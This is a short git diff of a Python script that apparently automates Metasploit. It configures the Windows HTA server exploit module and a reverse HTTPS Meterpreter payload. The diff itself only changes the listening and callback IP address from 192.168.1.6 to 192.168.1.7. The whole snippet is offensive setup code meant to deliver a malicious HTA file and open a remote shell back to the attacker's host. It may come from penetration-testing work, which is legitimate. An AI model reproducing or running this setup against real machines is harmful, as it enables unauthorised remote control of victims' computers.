@@ -5,9 +5,9 @@ def init(client):
     holy=''
     URL=''
     htaserver = client.modules.use('exploit','windows/misc/hta_server')
-    htaserver['SRVHOST']='192.168.1.6'
+    htaserver['SRVHOST']='192.168.1.7'
     spl = client.modules.use('payload','windows/meterpreter/reverse_https')
-    spl['LHOST'] = '192.168.1.6'
+    spl['LHOST'] = '192.168.1.7'
     spl['LPORT'] = '443'
     print("[*] Setting up hta server..")
     cid = client.consoles.console().cid
